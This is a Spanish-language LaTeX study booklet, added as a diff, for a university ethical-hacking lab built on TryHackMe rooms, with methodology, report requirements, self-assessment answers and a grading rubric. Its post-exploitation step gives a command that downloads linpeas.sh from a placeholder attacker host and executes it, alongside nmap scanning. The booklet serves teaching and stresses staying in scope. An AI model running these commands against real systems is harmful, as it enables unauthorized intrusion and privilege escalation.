@@ -1,0 +1,391 @@
+% =========================================================
+%  CUADERNILLO DE ESTUDIO - CLASE 9
+%  Seguridad Aplicada a Sistemas de Información
+%  Compilar con: pdfLaTeX (Overleaf o TeX Live/MiKTeX)
+% =========================================================
+\documentclass[11pt,a4paper]{article}
+
+% ----------------- Paquetes -----------------
+\usepackage[utf8]{inputenc}
+\usepackage[spanish]{babel}
+\usepackage{geometry}
+\geometry{left=2.2cm,right=2.2cm,top=2.5cm,bottom=2.5cm}
+\usepackage[table]{xcolor}
+\usepackage{tcolorbox}
+\tcbuselibrary{skins,breakable}
+\usepackage{enumitem}
+\usepackage{tabularx}
+\usepackage{booktabs}
+\usepackage{titlesec}
+\usepackage{fancyhdr}
+\usepackage{hyperref}
+\usepackage{listings}
+\usepackage{fontawesome5}
+\usepackage{comment} % Para la sección secreta
+
+% ----------------- Colores institucionales -----------------
+\definecolor{azulmat}{RGB}{0,84,140}
+\definecolor{griscaja}{RGB}{245,245,245}
+\definecolor{verdesuave}{RGB}{232,244,232}
+\definecolor{naranjasuave}{RGB}{255,244,230}
+\definecolor{azulsuave}{RGB}{232,240,250}
+\definecolor{violetasuave}{RGB}{240,232,250}
+\definecolor{rojosuave}{RGB}{255,235,235}
+\definecolor{thmgreen}{RGB}{0,168,132}
+
+\hypersetup{
+  colorlinks=true,
+  linkcolor=azulmat,
+  urlcolor=azulmat,
+  citecolor=azulmat
+}
+
+% ----------------- Estilo de código -----------------
+\lstset{
+  basicstyle=\ttfamily\small,
+  backgroundcolor=\color{griscaja},
+  frame=single,
+  breaklines=true,
+  keywordstyle=\color{blue}\bfseries,
+  commentstyle=\color{green!60!black},
+  stringstyle=\color{red},
+  showstringspaces=false,
+  numbers=left,
+  numberstyle=\tiny\color{gray}
+}
+
+% ----------------- Cajas de contenido -----------------
+\newtcolorbox{definicion}[1][Definición]{%
+  enhanced, breakable, colback=azulsuave, colframe=azulmat,
+  fonttitle=\bfseries, title=#1}
+
+\newtcolorbox{ejemplo}[1][Ejemplo]{%
+  enhanced, breakable, colback=naranjasuave, colframe=orange!75!black,
+  fonttitle=\bfseries, title=#1}
+
+\newtcolorbox{reflexion}[1][Para reflexionar]{%
+  enhanced, breakable, colback=verdesuave, colframe=green!55!black,
+  fonttitle=\bfseries, title=#1}
+
+\newtcolorbox{clave}[1][Idea clave]{%
+  enhanced, breakable, colback=griscaja, colframe=black!70,
+  fonttitle=\bfseries, title=#1}
+
+\newtcolorbox{respuesta}[1][Respuesta]{%
+  enhanced, breakable, colback=violetasuave, colframe=violet!60!black,
+  fonttitle=\bfseries, title=#1}
+
+\newtcolorbox{alerta}[1][Límite Ético / Legal]{%
+  enhanced, breakable, colback=rojosuave, colframe=red!70!black,
+  fonttitle=\bfseries, title=#1}
+
+\newtcolorbox{tip}[1][Tip de Supervivencia]{%
+  enhanced, breakable, colback=thmgreen!10, colframe=thmgreen!80!black,
+  fonttitle=\bfseries, title=#1}
+
+% ----------------- Encabezado y pie -----------------
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{\small Seguridad Aplicada a Sistemas de Información}
+\fancyhead[R]{\small Cuadernillo de Estudio --- Clase 9}
+\fancyfoot[C]{\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+
+% ----------------- Formato de títulos -----------------
+\titleformat{\section}{\large\bfseries\color{azulmat}}{\thesection.}{0.6em}{}
+\titleformat{\subsection}{\normalsize\bfseries\color{azulmat!80!black}}{\thesubsection.}{0.6em}{}
+
+% ----------------- Portada -----------------
+\title{%
+  \rule{\textwidth}{1pt}\\[0.4cm]
+  \textbf{\Large Cuadernillo de Estudio --- Clase 9}\\[0.2cm]
+  \large Laboratorio de Hacking Ético: Práctica de Revisión de Vulnerabilidades\\[0.2cm]
+  \rule{\textwidth}{1pt}\\[0.4cm]
+  \normalsize Seguridad Aplicada a Sistemas de Información\\
+  Licenciatura en Sistemas de Información --- Facultad de Informática y Diseño\\
+  Docente: Ing.\ Rodrigo Atilio Elgueta\\[0.2cm]
+  \small Ciclo Académico Vigente
+}
+\author{}
+\date{}
+
+\begin{document}
+\maketitle
+\thispagestyle{fancy}
+\tableofcontents
+\newpage
+
+% =========================================================
+\section{Objetivos de aprendizaje}
+Al finalizar esta etapa de laboratorio, el estudiante será capaz de:
+
+\begin{itemize}[leftmargin=*]
+  \item Configurar un entorno profesional de pentesting (Kali Linux, VPN, herramientas ofensivas).
+  \item Ejecutar las fases de \textbf{reconocimiento, escaneo, explotación y post-explotación} en entornos controlados (sandbox).
+  \item Documentar técnica y éticamente cada hallazgo, generando evidencia verificable.
+  \item Traducir vulnerabilidades técnicas a \textbf{riesgos de negocio} y proponer salvaguardas.
+  \item Elaborar un \textbf{Protocolo de Contingencia} para garantizar la continuidad del negocio ante fallas en los procedimientos.
+  \item Completar la \textbf{Actividad A08} para el cliente ficticio \textbf{INSECUR S.A.}
+\end{itemize}
+
+\begin{clave}[Cómo usar este cuadernillo]
+Este material es tu \textbf{Manual de Operaciones} para las Clases 9 y 10. No es una clase teórica tradicional: es una guía de campo. Leelo antes de conectarte a TryHackMe, tenelo abierto en una ventana mientras trabajás en la terminal, y usalo para estructurar tu informe final. Las respuestas de la autoevaluación están en la Sección~\ref{sec:respuestas}.
+\end{clave}
+
+% =========================================================
+\section{El Contrato: INSECUR S.A.}
+A partir de esta clase, dejás de ser un estudiante en un aula y asumís el rol de \textbf{Consultor de Hacking Ético}.
+
+\begin{reflexion}[El Briefing del Cliente]
+\textbf{Cliente:} INSECUR S.A.\\
+\textbf{Contexto:} La compañía está muy preocupada por los niveles de seguridad de sus sistemas y necesita tomar medidas adecuadas al respecto, motivo por el cual contrata tus servicios de Hacking Ético a fin de que les ayudes a elaborar un plan de seguridad y contingencia adecuado.\\
+\textbf{Tu Misión:} Realizar una auditoría ofensiva controlada, identificar las vías de compromiso y entregar un informe ejecutivo y técnico que permita a la empresa remediar las fallas antes de que un atacante real las explote.
+\end{reflexion}
+
+\begin{alerta}[Reglas de Enfrentamiento (ROE)]
+Como profesional, tu trabajo está estrictamente limitado a los \textbf{entornos de laboratorio (sandbox)} provistos por la plataforma TryHackMe. Cualquier intento de escanear, atacar o comprometer sistemas fuera de este alcance (incluyendo la red de la facultad, servidores públicos o sistemas de otros estudiantes) es una violación ética y un delito penal.
+\end{alerta}
+
+% =========================================================
+\section{Modelo de Trabajo: Núcleo + Elección}
+Para garantizar una base común de conocimientos y, al mismo tiempo, fomentar la especialización, el laboratorio se divide en dos niveles:
+
+\subsection{Nivel 1: Núcleo Obligatorio (Todos los estudiantes)}
+Estas salas cubren la metodología fundamental y la aplicación práctica básica.
+\begin{enumerate}[leftmargin=*]
+  \item \textbf{Pentesting Fundamentals:} Metodología y fases del pentesting profesional.
+  \item \textbf{Basic Pentesting:} Aplicación práctica completa (enumeración, explotación, escalada).
+\end{enumerate}
+
+\subsection{Nivel 2: Sala de Elección (Especialización)}
+Debés elegir \textbf{UNA} sala adicional de la lista curada de salas gratuitas de TryHackMe, según tu interés profesional. Esta elección debe quedar documentada en la portada de tu informe.
+
+\begin{center}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabularx}{\textwidth}{@{} p{3.5cm} c p{2cm} X @{}}
+\toprule
+\textbf{Sala} & \textbf{Dificultad} & \textbf{Enfoque} & \textbf{Perfil recomendado} \\
+\midrule
+\textbf{Vulnversity} & Inicial & Web + Exploit & Tu primera máquina, ideal para empezar. \\
+\textbf{Kenobi} & Inicial-Media & Samba + Linux PE & Si te interesa la enumeración de servicios. \\
+\textbf{RootMe} & Media & Web + PE & Si querés un desafío multi-vulnerabilidad. \\
+\textbf{OWASP Top 10} & Media & Vuln. Web & Si te orientás a desarrollo seguro / Bug Bounty. \\
+\textbf{Blue} & Media & Windows PE & Si querés especializarte en entornos corporativos Windows. \\
+\textbf{Overpass} & Media & Web + Lógica & Si te interesa la lógica de negocio y OSINT. \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+% =========================================================
+\section{Configuración del Arsenal}
+
+\subsection{Conexión a la VPN de TryHackMe}
+Para que tu máquina Kali pueda alcanzar las máquinas objetivo en la red privada de THM, debés conectarte a su VPN.
+\begin{lstlisting}[language=bash]
+# 1. Descarga tu archivo .ovpn desde THM (Account -> Access)
+# 2. Conecta la VPN desde tu terminal Kali
+sudo openvpn --config ~/Downloads/tu-usuario.ovpn
+\end{lstlisting}
+\textit{Verificación:} Hacé \texttt{ping} a la IP de la máquina objetivo. Si responde, estás dentro.
+
+\subsection{Organización del Repositorio de Entrega}
+Tu trabajo se entrega de forma profesional mediante control de versiones.
+\begin{lstlisting}[language=bash]
+# Clonar el repositorio oficial de la catedra
+git clone https://github.com/UCHSeguridad2026/TP_THM.git
+cd TP_THM
+
+# Crear tu branch personal (Reemplazar XXXXX por tu legajo)
+git checkout -b legajo-XXXXX
+
+# Crear la estructura de carpetas del pentest
+mkdir -p evidencias/{reconocimiento,escaneo,explotacion,post}
+mkdir -p bitacora
+mkdir -p reportes
+\end{lstlisting}
+
+% =========================================================
+\section{Metodología: El Ciclo del Pentester}
+No entres a la terminal a tirar comandos al azar. Seguí este flujo estricto para cada máquina:
+
+\begin{enumerate}[leftmargin=*]
+  \item \textbf{Reconocimiento Pasivo:} ¿Qué sabemos del objetivo antes de tocarlo? (OSINT, análisis de la interfaz web si la hay).
+  \item \textbf{Escaneo de Puertos:}
+  \begin{lstlisting}[language=bash]
+nmap -sC -sV -p- -oN bitacora/nmap_completo.txt <IP_OBJETIVO>
+  \end{lstlisting}
+  \item \textbf{Enumeración de Servicios:} Por cada puerto abierto, investigá la versión. Buscá exploits públicos (\texttt{searchsploit}, Google). Si es web, corré \texttt{gobuster} o \texttt{nikto}.
+  \item \textbf{Explotación:} Ejecutá el exploit. Si falla, revisá los parámetros (LHOST, LPORT, versión exacta).
+  \item \textbf{Post-Explotación:} Una vez dentro, el objetivo es \textbf{escalar privilegios}.
+  \begin{lstlisting}[language=bash]
+# En Linux:
+whoami && id && sudo -l
+wget http://TU_IP_KALI:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
+  \end{lstlisting}
+  \item \textbf{Documentación:} Cada paso crítico debe tener su captura de pantalla y su comando en la bitácora.
+\end{enumerate}
+
+% =========================================================
+\section{Guía de Supervivencia en el Laboratorio}
+
+\begin{tip}[¿Qué hago si me trabo? (La regla de los 15 minutos)]
+En el hacking, frustrarse es parte del proceso. Si llevás 15 minutos atascado en un paso, aplicá este protocolo:
+\begin{enumerate}
+  \item \textbf{Respirá y releé la salida del comando.} El 80\% de los errores son de tipeo o de no leer el mensaje de error de la consola.
+  \item \textbf{Verificá tu conectividad.} ¿Sigue activa la VPN? ¿Podés hacer ping a la máquina? ¿Tu Kali tiene salida a internet para descargar herramientas?
+  \item \textbf{Enumerá de nuevo.} Si la explotación falla, casi siempre es porque te faltó enumerar un puerto, un directorio web oculto o un usuario válido. Volvé a Nmap y Gobuster.
+  \item \textbf{Investigá el error.} Copiá el mensaje de error exacto y buscalo en Google o foros. Leer \textit{por qué} falló un exploit te enseña más que si hubiera funcionado a la primera.
+  \item \textbf{Pedí ayuda.} Levantá la mano en el aula o consultá en el foro de la cátedra, pero \textbf{nunca pidas la flag}. Pedí una \textit{pista metodológica} (ej: «¿Qué herramienta me sugieren para enumerar SMB?»).
+\end{enumerate}
+\end{tip}
+
+% =========================================================
+\section{Mecanismos de Control y Autenticidad}
+Para garantizar que el informe es de tu autoría y que realizaste el trabajo vos mismo, debés cumplir con estos 4 mecanismos:
+
+\begin{enumerate}[leftmargin=*]
+  \item \textbf{Username de THM:} Tu nombre de usuario único de TryHackMe debe figurar en la portada del informe y ser visible en las capturas de pantalla de la plataforma.
+  \item \textbf{Bitácora de Comandos:} Al finalizar cada sesión, exportá solo los comandos relevantes. Revisá el archivo y eliminá contraseñas, tokens y claves antes de subirlo.
+  \begin{lstlisting}[language=bash]
+history | sed -E 's/(password|passwd|token|secret|api[_-]?key)[^ ]*/\1=[REDACTED]/Ig' > bitacora/sesion_$(date +%F).txt
+  \end{lstlisting}
+  \item \textbf{Hashes de las Flags:} \textbf{NO publiques las flags en texto plano} en tu repositorio (GitHub es público y los writeups circulan). En su lugar, calculá el hash SHA-256 de la flag y pegalo en tu informe. El docente verificará que poseés la flag correcta sin que quede expuesta.
+  \begin{lstlisting}[language=bash]
+echo -n "thm{flag_aqui}" | sha256sum
+  \end{lstlisting}
+  \item \textbf{Commits Firmados:} Configurá Git con tu nombre real y email institucional.
+\end{enumerate}
+
+% =========================================================
+\section{El Entregable: Estructura del Informe}
+El informe para INSECUR S.A. debe seguir estrictamente la \textbf{Plantilla de Pentesting} provista por la cátedra. Asegurate de incluir:
+
+\begin{itemize}[leftmargin=*]
+  \item \textbf{Pre-Pentesting:} Alcance, Reglas de Enfrentamiento (ROE) y Metodología.
+  \item \textbf{Durante (Fichas de Hallazgos):} Cada vulnerabilidad con su CWE, CVSS, evidencia (captura + hash de flag) y comando utilizado.
+  \item \textbf{Post-Pentesting:} Recomendaciones técnicas (parches) y administrativas (políticas).
+  \item \textbf{Protocolo de Contingencia:} \textit{(Crítico para A08)}. ¿Qué pasa si al aplicar el parche o al ejecutar el exploit en un entorno real, el servicio crítico de INSECUR S.A. se cae? Debés definir el RTO (Tiempo Objetivo de Recuperación), el RPO (Punto Objetivo de Recuperación) y el plan de rollback.
+\end{itemize}
+
+% =========================================================
+\section{Glosario de conceptos clave}
+\begin{description}[leftmargin=!, labelwidth=3.5cm, font=\bfseries]
+  \item[Sandbox] Entorno aislado y seguro para ejecutar código o pruebas sin afectar sistemas de producción.
+  \item[ROE] \textit{Rules of Engagement}. Reglas de enfrentamiento que delimitan el alcance legal del pentest.
+  \item[Escalada de Privilegios] Proceso de explotar una falla para pasar de un usuario común a administrador (root/SYSTEM).
+  \item[LinPEAS / WinPEAS] Scripts de enumeración automática para buscar vectores de escalada de privilegios en Linux y Windows.
+  \item[Reverse Shell] Conexión donde la máquina víctima inicia la conexión de vuelta hacia el atacante, bypaseando firewalls de entrada.
+  \item[Hash SHA-256] Función criptográfica unidireccional usada para verificar la integridad de un dato (en este caso, demostrar posesión de una flag).
+\end{description}
+
+% =========================================================
+\section{Autoevaluación}\label{sec:autoeval}
+Respondé por escrito; luego verificá en la Sección~\ref{sec:respuestas}.
+
+\begin{enumerate}[leftmargin=*]
+  \item ¿Por qué es fundamental exportar la \textbf{bitácora de comandos} (\texttt{history}) al finalizar la sesión de pentesting?
+  \item En lugar de subir las flags en texto plano a GitHub, la cátedra pide subir su \textbf{hash SHA-256}. ¿Qué propiedad de la seguridad (Tríada CIA) estamos protegiendo al hacer esto y por qué?
+  \item Si durante la fase de explotación el servidor objetivo se «cuelga» o reinicia, ¿qué fase de la metodología debés volver a recorrer antes de intentar explotar nuevamente?
+  \item Explicá con tus palabras la diferencia entre \textbf{Remediación} y \textbf{Protocolo de Contingencia} en el informe para INSECUR S.A.
+  \item ¿Por qué un pentester ético nunca debe usar herramientas de escaneo masivo (como Nessus en modo agresivo) contra la red de la facultad o sistemas públicos?
+\end{enumerate}
+
+% =========================================================
+\section{Respuestas de la Autoevaluación}\label{sec:respuestas}
+
+\begin{clave}[Nota para el estudiante]
+Estas respuestas son de referencia. En tu informe y en las defensas orales se valorará tu capacidad de justificar las decisiones técnicas.
+\end{clave}
+
+\subsection*{Pregunta 1: Importancia de la bitácora de comandos}
+\begin{respuesta}
+La bitácora (\texttt{history}) es fundamental por tres motivos:
+\begin{enumerate}
+  \item \textbf{Trazabilidad y Auditoría:} Permite reconstruir exactamente qué comandos se ejecutaron, en qué orden y contra qué objetivos, demostrando que el trabajo se hizo dentro del alcance autorizado.
+  \item \textbf{Reproducibilidad:} Permite al equipo de IT del cliente (o al propio pentester) replicar los pasos para verificar la vulnerabilidad o probar si el parche aplicado fue efectivo.
+  \item \textbf{Control de Autenticidad:} Evita el plagio de \textit{writeups} de internet, ya que la bitácora refleja el proceso real, los errores cometidos y los caminos alternativos explorados por el estudiante.
+\end{enumerate}
+\end{respuesta}
+
+\subsection*{Pregunta 2: Hashes de Flags y la Tríada CIA}
+\begin{respuesta}
+Al publicar el hash SHA-256 en lugar de la flag en texto plano, estamos protegiendo la \textbf{Confidencialidad} de la evidencia.
+\textbf{Por qué:} Las plataformas como TryHackMe usan flags únicas o estáticas que, si se publican en repositorios públicos como GitHub, permiten que otros usuarios las copien sin realizar el trabajo. Al subir el hash, el estudiante \textbf{demuestra matemáticamente} que posee la flag (ya que puede generar el hash bajo demanda ante el docente), pero no la expone a terceros, manteniendo la integridad del ejercicio académico.
+\end{respuesta}
+
+\subsection*{Pregunta 3: Servidor que se «cuelga» durante la explotación}
+\begin{respuesta}
+Si el servidor se reinicia o deniega servicio tras un intento de explotación, debés volver a la fase de \textbf{Enumeración y Escaneo}.
+\textbf{Por qué:} Un reinicio puede indicar que el servicio vulnerable cambió de estado, que un mecanismo de defensa (como un IPS o un script de reinicio automático) se activó, o que el exploit fue inestable y corrompió la memoria del proceso. Volver a escanear (Nmap) te permite verificar si los puertos siguen abiertos, si las versiones cambiaron o si aparecieron nuevos servicios tras el reinicio.
+\end{respuesta}
+
+\subsection*{Pregunta 4: Remediación vs. Protocolo de Contingencia}
+\begin{respuesta}
+\begin{itemize}[leftmargin=*]
+  \item \textbf{Remediación:} Es la acción correctiva para \textbf{eliminar la vulnerabilidad} (ej. aplicar un parche de seguridad, cambiar una contraseña por defecto, segmentar la red). Responde a la pregunta: «¿Cómo arreglo el agujero?».
+  \item \textbf{Protocolo de Contingencia:} Es el plan de acción para \textbf{garantizar la continuidad del negocio} si la remediación falla o si el ataque ya ocurrió. Responde a la pregunta: «¿Qué hacemos si al aplicar el parche el servidor crítico de ventas se cae y no vuelve a levantar?». Incluye planes de rollback, servidores espejo, backups y tiempos de recuperación (RTO/RPO).
+\end{itemize}
+\end{respuesta}
+
+\subsection*{Pregunta 5: Ética en el escaneo masivo}
+\begin{respuesta}
+Un pentester ético nunca debe usar escáneres agresivos fuera del alcance autorizado porque:
+\begin{enumerate}
+  \item \textbf{Riesgo de Denegación de Servicio (DoS):} Los escaneos agresivos consumen ancho de banda y recursos de CPU/RAM, pudiendo tirar servicios legítimos (Disponibilidad).
+  \item \textbf{Violación Legal:} Escanear redes sin autorización escrita (como la red de la facultad o servidores en internet) es un delito informático tipificado en el Código Penal, independientemente de la «intención» de aprender.
+  \item \textbf{Ruido Forense:} Genera miles de alertas en los IDS/IPS de las organizaciones, entorpeciendo el trabajo de los equipos de Blue Team y ocultando posibles ataques reales.
+\end{enumerate}
+\end{respuesta}
+
+% =========================================================
+\section{Recordatorio: Actividad A08}
+\begin{clave}[Consigna A08 --- Práctica de Vulnerabilidades y Exploit]
+\textbf{Contexto:} INSECUR S.A. te contrata para elaborar un plan de seguridad y contingencia.\\
+\textbf{Tareas:} Completar las salas de TryHackMe (Núcleo + Elección).\\
+\textbf{Entregable:} Informe detallado utilizando la \textbf{Plantilla de Pentesting} de la cátedra. Debe incluir documentación previa, durante, recomendaciones posteriores y el Protocolo de Contingencia.\\
+\textbf{Modalidad:} Individual.\\
+\textbf{Repositorio:} Crear un branch \texttt{legajo-XXXXX} en \url{https://github.com/UCHSeguridad2026/TP_THM.git} y subir el PDF del informe, las evidencias y las bitácoras.
+\end{clave}
+
+\textbf{Rúbrica de evaluación (según grilla de la cátedra):}
+\begin{center}
+\renewcommand{\arraystretch}{1.2}
+\begin{tabularx}{\textwidth}{@{} l c X @{}}
+\toprule
+\textbf{Criterio} & \textbf{Peso} & \textbf{Qué se espera para el «Excelente» (4)} \\
+\midrule
+A. Recopilación de información & 10\% & Fuentes confiables y citadas (CVEs, documentación oficial). \\
+B. Elaboración de documentos & 25\% & Cumplimiento estricto de la Plantilla de Pentesting. \\
+C. Elaboración de presentaciones & 10\% & Argumentación sólida del riesgo de negocio ante INSECUR S.A. \\
+D. Integración de Soluciones & 25\% & Parches y medidas de contingencia integrados sobresalientemente. \\
+E. Selección de herramientas & 20\% & Herramientas adecuadas y justificadas técnicamente. \\
+F. Consciencia de buenas prácticas & 10\% & Respeto absoluto por la ética, ROE y anonimización de datos. \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+% =========================================================
+\section{Fuentes y bibliografía}
+
+\subsection{Plataformas y Laboratorios}
+\begin{itemize}[leftmargin=*]
+  \item TryHackMe. \textit{Pentesting Fundamentals}: \url{https://tryhackme.com/room/pentestingfundamentals}
+  \item TryHackMe. \textit{Basic Pentesting}: \url{https://tryhackme.com/room/basicpentestingjt}
+  \item Offensive Security. \textit{Metasploitable 2} (Entorno local alternativo).
+\end{itemize}
+
+\subsection{Bibliografía de la Cátedra}
+\begin{itemize}[leftmargin=*]
+  \item Chicano Tejada, E. (2023). \textit{Auditoría de seguridad informática. IFCT0109} (2.ª ed.). IC Editorial --- eLibro.
+  \item Evans, L. (2019). \textit{Ethical Hacking: The Ultimate Guide to Using Penetration Testing...}. Amazon Digital Services LLC --- KDP.
+  \item White, A. \& Clark, B. (2017). \textit{BTFM: Blue Team Field Manual}. CreateSpace.
+  \item Weidman, G. (2014). \textit{Penetration Testing: A Hands-On Introduction to Hacking}. No Starch Press.
+\end{itemize}
+
+\subsection{Marcos de Trabajo}
+\begin{itemize}[leftmargin=*]
+  \item NIST (2008). \textit{Technical Guide to Information Security Testing and Assessment (SP 800-115)}.
+  \item PTES (Penetration Testing Execution Standard): \url{http://www.pentest-standard.org/}
+\end{itemize}
+
+\end{document}
